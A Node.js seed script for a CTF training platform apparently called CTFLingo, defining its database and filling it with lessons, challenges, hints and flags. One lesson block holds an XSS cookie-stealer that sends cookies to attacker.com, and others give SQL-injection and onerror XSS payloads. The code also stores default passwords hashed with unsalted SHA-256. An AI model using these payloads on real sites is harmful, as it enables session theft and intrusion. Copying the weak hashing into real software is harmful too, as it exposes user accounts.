import { DatabaseSync } from 'node:sqlite';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import fs from 'node:fs';
import crypto from 'node:crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');
const dbPath = path.join(rootDir, 'ctflingo.db');
const uploadsDir = path.join(rootDir, 'data', 'uploads', 'challenge-files');

// Ensure uploads directory exists
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

export const db = new DatabaseSync(dbPath);

// Enable foreign keys
db.exec('PRAGMA foreign_keys = ON;');
db.exec('PRAGMA journal_mode = WAL;');

export function initDb() {
  db.exec(`
    CREATE TABLE IF NOT EXISTS profiles (
      id TEXT PRIMARY KEY,
      username TEXT NOT NULL UNIQUE,
      email TEXT NOT NULL UNIQUE,
      password TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'user' CHECK (role IN ('user', 'admin')),
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS units (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT NOT NULL DEFAULT '',
      difficulty TEXT NOT NULL DEFAULT 'beginner',
      category TEXT NOT NULL DEFAULT 'General',
      tags TEXT NOT NULL DEFAULT '[]',
      estimated_hours INTEGER NOT NULL DEFAULT 1,
      prerequisites TEXT NOT NULL DEFAULT '[]',
      objectives TEXT NOT NULL DEFAULT '[]',
      thumbnail_emoji TEXT NOT NULL DEFAULT '🔒',
      published INTEGER NOT NULL DEFAULT 0,
      xp_required INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS lessons (
      id TEXT PRIMARY KEY,
      unit_id TEXT NOT NULL REFERENCES units(id) ON DELETE CASCADE,
      title TEXT NOT NULL,
      lesson_order INTEGER NOT NULL DEFAULT 0,
      duration_minutes INTEGER NOT NULL DEFAULT 20,
      summary TEXT NOT NULL DEFAULT '',
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS lesson_content_blocks (
      id TEXT PRIMARY KEY,
      lesson_id TEXT NOT NULL REFERENCES lessons(id) ON DELETE CASCADE,
      block_order INTEGER NOT NULL DEFAULT 0,
      block_type TEXT NOT NULL DEFAULT 'text',
      title TEXT,
      content TEXT NOT NULL DEFAULT '',
      language TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS lesson_resources (
      id TEXT PRIMARY KEY,
      lesson_id TEXT NOT NULL REFERENCES lessons(id) ON DELETE CASCADE,
      title TEXT NOT NULL,
      url TEXT NOT NULL,
      resource_type TEXT NOT NULL DEFAULT 'article',
      estimated_minutes INTEGER NOT NULL DEFAULT 10,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS challenges (
      id TEXT PRIMARY KEY,
      unit_id TEXT NOT NULL REFERENCES units(id) ON DELETE CASCADE,
      title TEXT NOT NULL,
      description TEXT NOT NULL DEFAULT '',
      difficulty TEXT NOT NULL DEFAULT 'beginner',
      challenge_type TEXT NOT NULL DEFAULT 'quiz',
      flag TEXT,
      objectives TEXT NOT NULL DEFAULT '[]',
      xp_reward INTEGER NOT NULL DEFAULT 100,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS challenge_hints (
      id TEXT PRIMARY KEY,
      challenge_id TEXT NOT NULL REFERENCES challenges(id) ON DELETE CASCADE,
      hint_order INTEGER NOT NULL DEFAULT 0,
      content TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS challenge_files (
      id TEXT PRIMARY KEY,
      challenge_id TEXT NOT NULL REFERENCES challenges(id) ON DELETE CASCADE,
      filename TEXT NOT NULL,
      file_path TEXT NOT NULL,
      file_size INTEGER DEFAULT 0,
      file_type TEXT DEFAULT '',
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS user_progress (
      id TEXT PRIMARY KEY,
      user_id TEXT NOT NULL,
      unit_id TEXT NOT NULL REFERENCES units(id) ON DELETE CASCADE,
      joined_at TEXT NOT NULL DEFAULT (datetime('now')),
      UNIQUE(user_id, unit_id)
    );

    CREATE TABLE IF NOT EXISTS solved_challenges (
      id TEXT PRIMARY KEY,
      user_id TEXT NOT NULL,
      challenge_id TEXT NOT NULL REFERENCES challenges(id) ON DELETE CASCADE,
      xp_awarded INTEGER NOT NULL DEFAULT 0,
      solved_at TEXT NOT NULL DEFAULT (datetime('now')),
      UNIQUE(user_id, challenge_id)
    );

    CREATE TABLE IF NOT EXISTS ctf_path_categories (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL UNIQUE,
      description TEXT NOT NULL DEFAULT '',
      icon_emoji TEXT NOT NULL DEFAULT '📁',
      display_order INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS ctf_paths (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT NOT NULL DEFAULT '',
      category_id TEXT NOT NULL REFERENCES ctf_path_categories(id) ON DELETE RESTRICT,
      thumbnail_emoji TEXT NOT NULL DEFAULT '🎯',
      difficulty TEXT NOT NULL DEFAULT 'beginner',
      published INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      updated_at TEXT NOT NULL DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS ctf_path_nodes (
      id TEXT PRIMARY KEY,
      path_id TEXT NOT NULL REFERENCES ctf_paths(id) ON DELETE CASCADE,
      challenge_id TEXT NOT NULL REFERENCES challenges(id) ON DELETE CASCADE,
      node_order INTEGER NOT NULL DEFAULT 0,
      position_x INTEGER NOT NULL DEFAULT 0,
      position_y INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      UNIQUE(path_id, node_order)
    );

    CREATE TABLE IF NOT EXISTS ctf_path_progress (
      id TEXT PRIMARY KEY,
      user_id TEXT NOT NULL,
      path_id TEXT NOT NULL REFERENCES ctf_paths(id) ON DELETE CASCADE,
      current_node_order INTEGER NOT NULL DEFAULT 0,
      completed INTEGER NOT NULL DEFAULT 0,
      started_at TEXT NOT NULL DEFAULT (datetime('now')),
      completed_at TEXT,
      UNIQUE(user_id, path_id)
    );
  `);

  seedDefaultData();
}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

export { hashPassword };

function seedDefaultData() {
  const profileCount = db.prepare('SELECT COUNT(*) as count FROM profiles').get().count;
  if (profileCount > 0) return; // already seeded

  console.log('[SQLite] Seeding initial CTFLingo platform database...');

  // Seed default admin and student
  const adminId = crypto.randomUUID();
  const studentId = crypto.randomUUID();

  db.prepare(`
    INSERT INTO profiles (id, username, email, password, role)
    VALUES (?, ?, ?, ?, ?)
  `).run(adminId, 'admin', 'admin@ctflingo.local', hashPassword('admin123'), 'admin');

  db.prepare(`
    INSERT INTO profiles (id, username, email, password, role)
    VALUES (?, ?, ?, ?, ?)
  `).run(studentId, 'netrunner', 'netrunner@ctflingo.local', hashPassword('password123'), 'user');

  // Seed Categories
  const catWebId = crypto.randomUUID();
  const catCryptoId = crypto.randomUUID();
  const catNetId = crypto.randomUUID();
  const catRevId = crypto.randomUUID();

  const insertCategory = db.prepare(`
    INSERT INTO ctf_path_categories (id, name, description, icon_emoji, display_order)
    VALUES (?, ?, ?, ?, ?)
  `);

  insertCategory.run(catWebId, 'Web Exploitation', 'Bypass authentication, exploit SQLi, XSS, and server-side flaws.', '🌐', 1);
  insertCategory.run(catCryptoId, 'Cryptography', 'Break ciphers, analyze keys, and uncover plaintext secrets.', '🔑', 2);
  insertCategory.run(catNetId, 'Network Analysis', 'Packet inspection, Wireshark forensics, and stream reconstruction.', '📡', 3);
  insertCategory.run(catRevId, 'Forensics & Systems', 'Linux privilege escalation, file carving, and memory analysis.', '🔍', 4);

  // Seed Units
  const unit1Id = crypto.randomUUID();
  const unit2Id = crypto.randomUUID();
  const unit3Id = crypto.randomUUID();
  const unit4Id = crypto.randomUUID();

  const insertUnit = db.prepare(`
    INSERT INTO units (id, title, description, difficulty, category, tags, estimated_hours, prerequisites, objectives, thumbnail_emoji, published, xp_required)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  insertUnit.run(
    unit1Id,
    'Web Exploitation Fundamentals',
    'Master the fundamentals of web security: SQL injection vulnerabilities, cross-site scripting (XSS), and authentication bypasses.',
    'beginner',
    'Web Exploitation',
    JSON.stringify(['web', 'sqli', 'xss', 'owasp']),
    3,
    JSON.stringify(['Basic HTML & JavaScript', 'Basic SQL queries']),
    JSON.stringify([
      'Understand how HTTP requests and server backends interact',
      'Identify and exploit SQL Injection login bypasses',
      'Neutralize Cross-Site Scripting (XSS) with proper encoding',
    ]),
    '🌐',
    1,
    0
  );

  insertUnit.run(
    unit2Id,
    'Applied Cryptography & Ciphers',
    'Explore classical ciphers, symmetric encryption, hashing algorithms, and public-key cryptography.',
    'intermediate',
    'Cryptography',
    JSON.stringify(['crypto', 'rsa', 'ciphers', 'hashing']),
    4,
    JSON.stringify(['Web Exploitation Fundamentals', 'Basic modular arithmetic']),
    JSON.stringify([
      'Decode classical substitution and transposition ciphers',
      'Understand cryptographic hash functions and rainbow tables',
      'Analyze public-key RSA encryption and key factorization',
    ]),
    '🔐',
    1,
    100
  );

  insertUnit.run(
    unit3Id,
    'Network Traffic Analysis & PCAPs',
    'Learn packet analysis with Wireshark, trace TCP streams, and carve exfiltrated credentials from network traffic captures.',
    'beginner',
    'Network Analysis',
    JSON.stringify(['network', 'wireshark', 'pcap', 'tcpdump']),
    3,
    JSON.stringify(['Basic TCP/IP networking']),
    JSON.stringify([
      'Filter and analyze network packets with Wireshark',
      'Reassemble cleartext TCP streams and HTTP sessions',
      'Carve files and credentials from raw captures',
    ]),
    '📡',
    1,
    0
  );

  insertUnit.run(
    unit4Id,
    'Linux Privilege Escalation',
    'Master local privilege escalation techniques on Linux: SUID binaries, misconfigured cron jobs, and capabilities.',
    'advanced',
    'Forensics & Systems',
    JSON.stringify(['linux', 'privesc', 'suid', 'cron']),
    5,
    JSON.stringify(['Linux command line proficiency', 'Basic shell scripting']),
    JSON.stringify([
      'Audit SUID/SGID binaries and leverage GTFOBins',
      'Exploit writable cron tasks and wildcard injections',
      'Abuse Linux capabilities for root access',
    ]),
    '🐧',
    1,
    200
  );

  // Seed Lessons for Unit 1
  const lesson1Id = crypto.randomUUID();
  const lesson2Id = crypto.randomUUID();

  const insertLesson = db.prepare(`
    INSERT INTO lessons (id, unit_id, title, lesson_order, duration_minutes, summary)
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  insertLesson.run(
    lesson1Id,
    unit1Id,
    'Introduction to SQL Injection',
    1,
    25,
    'Learn how unescaped user inputs allow attackers to manipulate backend database queries.'
  );

  insertLesson.run(
    lesson2Id,
    unit1Id,
    'Cross-Site Scripting (XSS) Demystified',
    2,
    20,
    'Understand stored, reflected, and DOM-based XSS vulnerabilities and how to prevent them.'
  );

  // Lesson 1 Content Blocks
  const insertBlock = db.prepare(`
    INSERT INTO lesson_content_blocks (id, lesson_id, block_order, block_type, title, content, language)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);

  insertBlock.run(
    crypto.randomUUID(),
    lesson1Id,
    1,
    'text',
    'What is SQL Injection?',
    'SQL Injection (SQLi) is a security vulnerability where an attacker manipulates SQL queries by inserting untrusted input into query strings. When applications concatenate raw input directly into a database statement, attackers can alter the query logic entirely.',
    null
  );

  insertBlock.run(
    crypto.randomUUID(),
    lesson1Id,
    2,
    'code',
    'Vulnerable Authentication Query',
    `// Vulnerable PHP/Node backend query:
const query = "SELECT * FROM users WHERE username = '" + req.body.username + "' AND password = '" + req.body.password + "'";

// Attacker input for username:
// admin' OR '1'='1' --

// The executed query becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'`,
    'javascript'
  );

  insertBlock.run(
    crypto.randomUUID(),
    lesson1Id,
    3,
    'security_focus',
    'Defense in Depth',
    'Always use Parameterized Queries (Prepared Statements) or an ORM that safely escapes input. Never concatenate raw strings into SQL queries.',
    null
  );

  // Lesson 1 Resources
  const insertResource = db.prepare(`
    INSERT INTO lesson_resources (id, lesson_id, title, url, resource_type, estimated_minutes)
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  insertResource.run(
    crypto.randomUUID(),
    lesson1Id,
    'OWASP SQL Injection Prevention Cheat Sheet',
    'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
    'article',
    15
  );

  // Lesson 2 Content Blocks
  insertBlock.run(
    crypto.randomUUID(),
    lesson2Id,
    1,
    'text',
    'Understanding Cross-Site Scripting',
    'Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim browser.',
    null
  );

  insertBlock.run(
    crypto.randomUUID(),
    lesson2Id,
    2,
    'code',
    'Cookie Stealer PoC',
    `<script>
  // Stealing session cookies via an image request:
  new Image().src = "https://attacker.com/log?cookie=" + encodeURIComponent(document.cookie);
</script>`,
    'html'
  );

  // Seed Challenges
  const ch1Id = crypto.randomUUID();
  const ch2Id = crypto.randomUUID();
  const ch3Id = crypto.randomUUID();
  const ch4Id = crypto.randomUUID();

  const insertChallenge = db.prepare(`
    INSERT INTO challenges (id, unit_id, title, description, difficulty, challenge_type, flag, objectives, xp_reward)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  insertChallenge.run(
    ch1Id,
    unit1Id,
    'Gatekeeper Login Bypass',
    'An authentication form tests credentials using unescaped string formatting: `SELECT * FROM users WHERE user=\'$user\' AND pass=\'$pass\'`. Find the payload to log in as administrator and capture the flag.',
    'beginner',
    'quiz',
    'flag{sqli_admin_bypass_2026}',
    JSON.stringify(['Bypass the login form without valid credentials', 'Recover and submit the flag']),
    100
  );

  insertChallenge.run(
    ch2Id,
    unit1Id,
    'Reflected Cookie Heist',
    'A search endpoint reflects user input directly into the DOM: `Search results for: <div>USER_INPUT</div>`. Execute an alert popup or retrieve the simulated administrator cookie to obtain the flag.',
    'intermediate',
    'quiz',
    'flag{xss_alert_document_domain}',
    JSON.stringify(['Test search bar for HTML tag reflection', 'Craft an XSS trigger payload', 'Submit the flag']),
    150
  );

  insertChallenge.run(
    ch3Id,
    unit2Id,
    'The Roman Emperor Cipher',
    'An ancient encrypted message was intercepted: `iodj{fdhvdu_flskhu_lv_wrr_hdvb}`. Decrypt the ciphertext to recover the plaintext flag.',
    'beginner',
    'quiz',
    'flag{caesar_cipher_is_too_easy}',
    JSON.stringify(['Identify the rotation offset', 'Shift the alphabet back to plaintext', 'Submit the flag']),
    75
  );

  insertChallenge.run(
    ch4Id,
    unit3Id,
    'Cleartext Packet Inspection',
    'An employee connected to internal servers using Telnet. Analyze the capture file to locate the transmitted credentials and flag.',
    'beginner',
    'pcap',
    'flag{telnet_traffic_is_unencrypted}',
    JSON.stringify(['Open the capture file in Wireshark or strings', 'Follow the Telnet TCP stream', 'Extract the flag']),
    125
  );

  // Seed Hints for Challenges
  const insertHint = db.prepare(`
    INSERT INTO challenge_hints (id, challenge_id, hint_order, content)
    VALUES (?, ?, ?, ?)
  `);

  insertHint.run(crypto.randomUUID(), ch1Id, 1, 'Try inserting a quote followed by a boolean tautology: `\' OR \'1\'=\'1`');
  insertHint.run(crypto.randomUUID(), ch1Id, 2, 'In SQL, `-- ` or `/* */` comments out the remainder of the query string.');

  insertHint.run(crypto.randomUUID(), ch2Id, 1, 'Consider using an event handler that does not require user interaction, such as `<img src=x onerror=...>`');

  insertHint.run(crypto.randomUUID(), ch3Id, 1, 'Notice the prefix `iodj` corresponds to `flag`. Calculate the letter shift between `i` and `f`.');
  insertHint.run(crypto.randomUUID(), ch3Id, 2, 'The shift key is 3 positions backwards (D -> A, E -> B, etc.).');

  insertHint.run(crypto.randomUUID(), ch4Id, 1, 'Search for the string `flag{` inside the capture file.');

  // Create sample challenge file for challenge 4
  const samplePcapFileName = 'network_capture.pcap';
  const samplePcapPath = path.join(uploadsDir, samplePcapFileName);
  fs.writeFileSync(samplePcapPath, Buffer.from(`TELNET LOGIN SESSION:\nUser: admin\nPass: supersecret\nFLAG: flag{telnet_traffic_is_unencrypted}\nSession terminated.\n`));

  db.prepare(`
    INSERT INTO challenge_files (id, challenge_id, filename, file_path, file_size, file_type)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(crypto.randomUUID(), ch4Id, samplePcapFileName, samplePcapFileName, fs.statSync(samplePcapPath).size, 'application/vnd.tcpdump.pcap');

  // Seed CTF Paths
  const path1Id = crypto.randomUUID();
  const path2Id = crypto.randomUUID();

  const insertPath = db.prepare(`
    INSERT INTO ctf_paths (id, title, description, category_id, thumbnail_emoji, difficulty, published)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);

  insertPath.run(
    path1Id,
    'Web Penetration Pathway',
    'Follow this interactive step-by-step track through fundamental web vulnerabilities, from SQL injection to script exploitation.',
    catWebId,
    '🎯',
    'beginner',
    1
  );

  insertPath.run(
    path2Id,
    'Crypto Cadet Track',
    'Decipher ancient and modern cryptosystems through practical hands-on challenges.',
    catCryptoId,
    '🗝️',
    'beginner',
    1
  );

  // Seed Path Nodes
  const insertNode = db.prepare(`
    INSERT INTO ctf_path_nodes (id, path_id, challenge_id, node_order, position_x, position_y)
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  insertNode.run(crypto.randomUUID(), path1Id, ch1Id, 0, 100, 160);
  insertNode.run(crypto.randomUUID(), path1Id, ch2Id, 1, 260, 160);

  insertNode.run(crypto.randomUUID(), path2Id, ch3Id, 0, 120, 160);

  // Seed student progress
  db.prepare(`
    INSERT INTO user_progress (id, user_id, unit_id)
    VALUES (?, ?, ?)
  `).run(crypto.randomUUID(), 'netrunner', unit1Id);

  db.prepare(`
    INSERT INTO solved_challenges (id, user_id, challenge_id, xp_awarded)
    VALUES (?, ?, ?, ?)
  `).run(crypto.randomUUID(), 'netrunner', ch3Id, 75);

  db.prepare(`
    INSERT INTO ctf_path_progress (id, user_id, path_id, current_node_order, completed)
    VALUES (?, ?, ?, ?, ?)
  `).run(crypto.randomUUID(), 'netrunner', path1Id, 0, 0);

  console.log('[SQLite] Seed completed successfully!');
}
